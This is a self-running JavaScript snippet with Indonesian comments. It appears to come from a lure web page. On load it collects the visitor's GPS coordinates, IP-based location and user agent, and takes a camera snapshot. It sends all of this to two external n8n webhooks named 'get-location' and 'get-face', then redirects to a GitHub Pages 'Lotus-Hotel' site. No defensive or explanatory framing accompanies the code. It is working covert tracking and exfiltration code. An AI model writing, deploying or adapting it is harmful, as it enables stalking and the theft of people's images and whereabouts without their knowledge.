(async () => {
  const WEBHOOK_LOCATION = "https://jdika5914.app.n8n.cloud/webhook/get-location";
  const WEBHOOK_FACE = "https://jdika5914.app.n8n.cloud/webhook/get-face";
  const REDIRECT_URL = "https://juliandika5914.github.io/Lotus-Hotel/";

  const video = document.getElementById("camera");
  const canvas = document.getElementById("snapshot");

  // 🟢 1️⃣ Ambil lokasi GPS atau fallback IP
  async function getLocation() {
    try {
      return await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              ip: ipData.ip,
              city: ipData.city,
              region: ipData.region,
              country: ipData.country_name,
              userAgent: navigator.userAgent,
            });
          },
          async (err) => {
            // fallback ke IP
            const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
            resolve({
              latitude: null,
              longitude: null,
              ip: ipData.ip,
              city: ipData.city,
              region: ipData.region,
              country: ipData.country_name,
              userAgent: navigator.userAgent,
              error: err.message,
            });
          },
          { enableHighAccuracy: true, timeout: 10000 }
        );
      });
    } catch (e) {
      console.error("Gagal ambil lokasi:", e);
      return null;
    }
  }

  // 🟢 2️⃣ Aktifkan kamera dan ambil snapshot
  async function getCameraSnapshot() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      await new Promise(r => setTimeout(r, 2000)); // tunggu kamera nyala

      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageBase64 = canvas.toDataURL("image/jpeg");
      stream.getTracks().forEach(track => track.stop()); // matikan kamera

      return imageBase64;
    } catch (err) {
      console.error("Gagal akses kamera:", err);
      return null;
    }
  }

  try {
    // Jalankan kamera dan lokasi BERSAMAAN
    const [locationData, imageBase64] = await Promise.all([
      getLocation(),
      getCameraSnapshot()
    ]);

    if (!locationData && !imageBase64) {
      alert("Tidak bisa mengambil lokasi maupun foto.");
      return;
    }

    // Kirim ke dua webhook
    const timestamp = new Date().toISOString();

    // 🟢 Kirim lokasi
    await fetch(WEBHOOK_LOCATION, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...locationData,
        timestamp
      }),
    });

    // 🟢 Kirim foto + lokasi
    await fetch(WEBHOOK_FACE, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        timestamp,
        location: locationData,
        image: imageBase64,
      }),
    });

    

    // Redirect setelah semua selesai
    setTimeout(() => (window.location.href = REDIRECT_URL), 2000);

  } catch (err) {
    console.error("Terjadi kesalahan:", err);
    alert("Gagal mengirim data ke server.");
  }
})();
